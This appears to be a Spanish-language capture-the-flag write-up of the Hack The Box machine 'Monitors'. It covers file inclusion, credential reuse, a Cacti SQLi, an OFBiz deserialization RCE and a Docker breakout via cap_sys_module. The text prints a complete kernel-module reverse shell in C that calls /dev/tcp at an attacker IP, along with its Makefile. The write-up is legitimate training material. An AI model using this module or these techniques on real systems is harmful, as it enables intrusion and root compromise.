@@ -1,0 +1,281 @@
+I"7J<p><img src="Pasted%20image%2020221204180442.png" alt="" /></p>
+
+<p>Hoy vamos a realizar un writeup de maquina linux retirada <code class="language-plaintext highlighter-rouge">Monitors</code> alojada en la plataforma de <code class="language-plaintext highlighter-rouge">Hack The Box</code>,  por aqui os dejo mi perfil por si quereis darme respect jejejej</p>
+
+<ul>
+  <li><a href="https://www.hackthebox.com/home/users/profile/1019735">https://www.hackthebox.com/home/users/profile/1019735</a></li>
+</ul>
+
+<h3 id="user">User</h3>
+
+<p>Hacemos un escaneo inicial para ver los puertos abiertos</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>	<span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-p-</span> <span class="nt">-open</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.238
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Acto seguido usamos los scripts que nos aporta la utilidad nmap para hacer un reconocimiendo de los mismos</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>	<span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.238 <span class="nt">-oN</span> targeted
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="Pasted%20image%2020221204180731.png" alt="" /></p>
+
+<p>Entramos a la web que se ejecuta en el puerto 80, vemos que nos dice lo siguiente aprovechandonos del correo vemos el dominio <code class="language-plaintext highlighter-rouge">"monitors.htb"</code> este mismo deberemos añadirlo al fichero <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para que al ponerlo nos resuelva hacia la maquina y ver si se aplica virtual hosting</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>10.10.10.238 monitors.htb
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="Pasted%20image%2020221204180735.png" alt="" /></p>
+
+<p>Entramos a la web y vemos que se aplica Virtual Hosting ya que cambia el contenido, leyendo el pie de pagina vemos que estamos frente a un wordpress por lo que podríamos enumerar usuarios validos en el login pero en este caso no ya que solo hay un post del usuario admin.<br />
+Por lo que se nos ocurririía enumerar plugins en busca de alguno vulnerable.</p>
+
+<p><img src="Pasted%20image%2020221204180749.png" alt="" /></p>
+
+<p>Para esto podríamos usar el repositorio de seclists en github que nos incluye diccionarios para probar fuzzeando o mejor aun construirnos un script que nos permita crear un diccionario con los nombres de los 52.700 plugins registrados.</p>
+
+<p><img src="Pasted%20image%2020221204180754.png" alt="" />
+<img src="Pasted%20image%2020221204180805.png" alt="" /></p>
+
+<p>Primeramente probaremos a ver si tenemos capacidad de directory listing en <code class="language-plaintext highlighter-rouge">/wp-content/plugins/</code> y efectivamente la tenemos lo cual es poco habitual<br />
+<img src="Pasted%20image%2020221204180820.png" alt="" /></p>
+
+<p>Con esto en mano buscamos el unico plugin en searchsploit por si hubiese alguna vulnerabilidad asociada y encontramos un <code class="language-plaintext highlighter-rouge">RFI -&gt; Remote File Inclusion</code>
+<img src="Pasted%20image%2020221204180830.png" alt="" /></p>
+
+<p>Si lo examinamos podemos ver como funciona
+<img src="Pasted%20image%2020221204180852.png" alt="" /></p>
+
+<p>Teniendo esto en cuenta listamos archivos de utilidad como pueden ser el /etc/passwd para ver los usuarios existentes</p>
+
+<blockquote>
+  <p>( Ya que se trata de un RFI si probamos a cargar un archivo php de nuesta maquina vemos que no nos lo interpreta asi que solo podremos listar contenido de la propia maquina)
+<img src="Pasted%20image%2020221204180917.png" alt="" /></p>
+</blockquote>
+
+<p>Tambien podemos listar el archivo <code class="language-plaintext highlighter-rouge">/proc/net/tcp</code> para ver los puertos abiertos
+<img src="Pasted%20image%2020221204180931.png" alt="" /></p>
+
+<p>En este caso lo hago con curl para guardar el resultado en un archivo
+<img src="Pasted%20image%2020221204180942.png" alt="" /></p>
+
+<p>Y con la herramienta que creé y que está en mi github: <a href="https://github.com/whitexnd/OpenPorts">https://github.com/whitexnd/OpenPorts</a> podemos ver que puertos tiene abiertos internamente en este caso el 80 no sale representado lo cual es un poco raro y vemos tambien el puerto 8443 el cual tambien es un poco raro
+<img src="Pasted%20image%2020221204180958.png" alt="" /></p>
+
+<p>Tambien listamos el archivo <code class="language-plaintext highlighter-rouge">/etc/apache2/sites-enabled/000-default.conf</code> el cual contiene información de la web y vemos que hay un subdomnio, lo añadimos de nuevo al fichero /etc/hosts
+<img src="Pasted%20image%2020221204181005.png" alt="" /></p>
+
+<p>Y lo buscamos a ver si hubiese contenido, en este caso vemos Cacti que parece ser una utilidad de graficos según google
+<img src="Pasted%20image%2020221204181026.png" alt="" /></p>
+
+<p>Tambien aprovechamos para ver el fichero <code class="language-plaintext highlighter-rouge">wp-config.php</code> el cual suele contener el usuario y contraseña empleados en la base de datos de wordpress
+<img src="Pasted%20image%2020221204181029.png" alt="" /></p>
+
+<p>Probamos a logearnos con admin y la credencial que vimos por si se reutilizara
+<img src="Pasted%20image%2020221204181043.png" alt="" /></p>
+
+<p>Y logramos acceso a cacti
+<img src="Pasted%20image%2020221204181054.png" alt="" /></p>
+
+<p>Buscamos en searchsploit por si hubiera algun tipo de exploit para la versión de cacti que utiliza la maquina
+<img src="Pasted%20image%2020221204181154.png" alt="" /></p>
+
+<p>Mediante una <code class="language-plaintext highlighter-rouge">inyección sql (SQLi)</code> busca entablar una reverse shell, por lo que lo usaremos para automatizar este proceso
+<img src="Pasted%20image%2020221204181158.png" alt="" /></p>
+
+<p>Una vez dentro como el user <code class="language-plaintext highlighter-rouge">www-data</code> vemos que hay otro usuario marcus al cual nos interesa pivotar para poder ver su flag, listamos su home y vemos algo raro
+<img src="Pasted%20image%2020221204181202.png" alt="" /></p>
+
+<p>Hay una carpeta oculta <code class="language-plaintext highlighter-rouge">.backup</code> a la cual no tenemos acceso
+<img src="Pasted%20image%2020221204181207.png" alt="" /></p>
+
+<p>Por lo que en este punto probamos a grepear recursivamente la cadena marcus en algun fichero en <code class="language-plaintext highlighter-rouge">/etc</code> y encontramos que algo menciona a un script en shell dentro de la carpeta que vimos antes
+<img src="Pasted%20image%2020221204181212.png" alt="" /></p>
+
+<p>Tratamos de hacerle un cat para ver si tuviesemos acceso a su contenido y vemos un usuario y contraseña
+<img src="Pasted%20image%2020221204181224.png" alt="" /></p>
+
+<p>La probamos por si se reutilizase
+<img src="Pasted%20image%2020221204181227.png" alt="" /></p>
+
+<p>Y ya unicamente listariamos la flag <code class="language-plaintext highlighter-rouge">user.txt</code> de su direcctorio
+<img src="Pasted%20image%2020221204181232.png" alt="" /></p>
+
+<h3 id="root">Root</h3>
+
+<p>Examinamos nuestra ip por si se estuviesemos en un contenedor y en este caso no
+<img src="Pasted%20image%2020221204181412.png" alt="" /></p>
+
+<p>Viendo de nuevo el direcctorio personal vemos un archivo note.txt que habla de una imagen docker
+<img src="Pasted%20image%2020221204181415.png" alt="" /></p>
+
+<p>Por lo que pensando en esto y sin la capacidad de ver las imagenes de docker activas buscamos algun puerto más abierto y volvemos a ver el 8443
+<img src="Pasted%20image%2020221204181419.png" alt="" /></p>
+
+<p>Ahora mediante SSH realizamos un Local Port Forwarding para que nuestro puerto local sea el mismo que el de la victima y podamos verlo</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>ssh marcus@10.10.10.238 <span class="nt">-L</span> 8443:127.0.0.1:8443
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Y navegando vemos que tenemos acceso
+<img src="Pasted%20image%2020221204181518.png" alt="" /></p>
+
+<p>Hacemos uso de wfuzz para encontrar direcctorios</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>wfuuz
+	<span class="nt">-c</span> -&gt; Formato colorizado
+	<span class="nt">-t</span> -&gt; Cantidad de hilos
+	<span class="nt">--hc</span><span class="o">=</span>404 -&gt; Para que nos oculte las peticiones que devuelvan el estado 404
+	<span class="nt">-w</span> -&gt; Indicarle el diccionario
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Vemos varios que nos dan un codigo 302 el cual es un redirect
+<img src="Pasted%20image%2020221204181547.png" alt="" /></p>
+
+<p>Ponemos uno cualquiera y nos lleva a la siguiente web
+<img src="Pasted%20image%2020221204184657.png" alt="" /></p>
+
+<p>Viendo el footer vemos que emplea Apache OFBiz
+<img src="Pasted%20image%2020221204184711.png" alt="" /></p>
+
+<p>Y buscando exploit relacionados a esto encontramos un script en shell el cual nos permite <code class="language-plaintext highlighter-rouge">RCE -&gt; Remote Command Execution</code>
+<img src="Pasted%20image%2020221204184723.png" alt="" /></p>
+
+<p>Según el script se trata de un ataque de <code class="language-plaintext highlighter-rouge">Insecure Deserialization</code> podríamos ejecutar el script pasandole los argumentos y obtendríamos acceso, en este caso lo he ido haciendo sentencia a sentencia
+<img src="Pasted%20image%2020221204184734.png" alt="" /></p>
+
+<p>Primero cargando mi payload en un fichero que posteriormente la victima se descargará
+<img src="Pasted%20image%2020221204184746.png" alt="" /></p>
+
+<p>Descargarnos el archivo indicado en el script para generar JAR pyaloads
+<img src="Pasted%20image%2020221204184757.png" alt="" /></p>
+
+<p>Generamos uno con la siguiente sentencia que lo que hace es descargarse un recurso de nuestra maquina y guardarlo en la ruta <code class="language-plaintext highlighter-rouge">/tmp</code>, todo esto lo convertimos a base64 y le quitamos el salto de linea del final
+<img src="Pasted%20image%2020221204184808.png" alt="" /></p>
+
+<p>Iniciamos el servidor web desde el que compartiremos nuestro shell.sh malicioso
+<img src="Pasted%20image%2020221204184822.png" alt="" /></p>
+
+<p>Hacemos una petición curl como se especifica en el script junto al payload jar que hemos creado
+<img src="Pasted%20image%2020221204184854.png" alt="" /></p>
+
+<p>Y vemos que efectivamente se ha ejecutado ya que hemos recibido una petición GET al archivo shell.sh
+<img src="Pasted%20image%2020221204184903.png" alt="" /></p>
+
+<p>Creamos el ultimo payload para que interprete el archivo que guardó en <code class="language-plaintext highlighter-rouge">/tmp</code>
+<img src="Pasted%20image%2020221204184914.png" alt="" /></p>
+
+<p>Hacemos el curl
+<img src="Pasted%20image%2020221204184923.png" alt="" /></p>
+
+<p>Y vemos que por el puerto en el que estabamos en escucha nos llega la reverse shell
+<img src="Pasted%20image%2020221204184945.png" alt="" /></p>
+
+<p>Vemos nuestra ip para ver si estamos en un docker y efectivamente
+<img src="Pasted%20image%2020221204184955.png" alt="" /></p>
+
+<p>Nos descargamos LinPeas, el cual es una utilidad de reconocimineto del sistema que podemos encontrar en github y nos la compartimos con un servidor web python como en el anterior ejemplo para descargarnoslo en la maquina victima, despues le damos permisos de ejecución y lo ejecutamos. Atendiendo al resultado vemos que está asignada la capabilitie <code class="language-plaintext highlighter-rouge">cap_sys_module</code>
+<img src="Pasted%20image%2020221204185009.png" alt="" /></p>
+
+<p>Con el siguiente comando podemos listar las capabilities
+<img src="Pasted%20image%2020221204185018.png" alt="" /></p>
+
+<p>Buscando en google encontramos esta pagina la cual nos explica bastante bien como funciona y como abusar de la capabilitie<br />
+<a href="https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd">https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd</a></p>
+
+<p>En este caso tenemos que crearnos el siguiente archivo con nuestra ip y puerto para intentar cargar un modulo kernel que nos entable una reverse shell
+<img src="Pasted%20image%2020221204185028.png" alt="" /></p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;linux/kmod.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
+</span>
+<span class="n">MODULE_LICENSE</span><span class="p">(</span><span class="s">"GPL"</span><span class="p">);</span>
+<span class="n">MODULE_AUTHOR</span><span class="p">(</span><span class="s">"AttackDefense"</span><span class="p">);</span>
+<span class="n">MODULE_DESCRIPTION</span><span class="p">(</span><span class="s">"LKM reverse shell module"</span><span class="p">);</span>
+<span class="n">MODULE_VERSION</span><span class="p">(</span><span class="s">"1.0"</span><span class="p">);</span>
+
+<span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/bash"</span><span class="p">,</span> <span class="s">"-c"</span><span class="p">,</span> <span class="s">"bash -i &gt;&amp; /dev/tcp/10.10.14.22/4444 0&gt;&amp;1"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
+
+<span class="k">static</span> <span class="kt">char</span><span class="o">*</span> <span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
+
+<span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">reverse_shell_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+
+	<span class="k">return</span> <span class="n">call_usermodehelper</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">,</span> <span class="n">UMH_WAIT_EXEC</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="n">__exit</span> <span class="nf">reverse_shell_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+
+	<span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"Exiting</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">module_init</span><span class="p">(</span><span class="n">reverse_shell_init</span><span class="p">);</span>
+<span class="n">module_exit</span><span class="p">(</span><span class="n">reverse_shell_exit</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Y tambien un makefile con las siguientes instrucciones:
+<img src="Pasted%20image%2020221204185056.png" alt="" /></p>
+
+<div class="language-rb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="n">obj</span><span class="o">-</span><span class="n">m</span> <span class="o">+=</span><span class="n">reverse</span><span class="o">-</span><span class="n">shell</span><span class="p">.</span><span class="nf">o</span>
+
+<span class="ss">all:
+	</span><span class="n">make</span> <span class="o">-</span><span class="no">C</span> <span class="sr">/lib/mo</span><span class="n">dules</span><span class="o">/</span><span class="err">$</span><span class="p">(</span><span class="n">shell</span> <span class="n">uname</span> <span class="o">-</span><span class="n">r</span><span class="p">)</span><span class="o">/</span><span class="n">build</span> <span class="no">M</span><span class="o">=</span><span class="err">$</span><span class="p">(</span><span class="no">PWD</span><span class="p">)</span> <span class="n">modules</span>
+<span class="ss">clean:
+	</span><span class="n">make</span> <span class="o">-</span><span class="no">C</span> <span class="sr">/lib/mo</span><span class="n">dules</span><span class="o">/</span><span class="err">$</span><span class="p">(</span><span class="n">shell</span> <span class="n">uname</span> <span class="o">-</span><span class="n">r</span><span class="p">)</span><span class="o">/</span><span class="n">build</span> <span class="no">M</span><span class="o">=</span><span class="err">$</span><span class="p">(</span><span class="no">PWD</span><span class="p">)</span> <span class="n">clean</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Una vez con estos dos
+<img src="Pasted%20image%2020221204185116.png" alt="" /></p>
+
+<p>Ejecutamos el comando make
+<img src="Pasted%20image%2020221204185128.png" alt="" /></p>
+
+<p>Nos ponemos en escucha
+<img src="Pasted%20image%2020221204185139.png" alt="" /></p>
+
+<p>Y cargamos en el kernel el fichero reverse-shell.ko que nos generó
+<img src="Pasted%20image%2020221204185149.png" alt="" /></p>
+
+<p>Y vualá obtenemos una sesión como root en la maquina victima
+<img src="Pasted%20image%2020221204185200.png" alt="" /></p>
+
+<p>Y ya podemos listar la flag
+<img src="Pasted%20image%2020221204185208.png" alt="" /></p>
+:ET
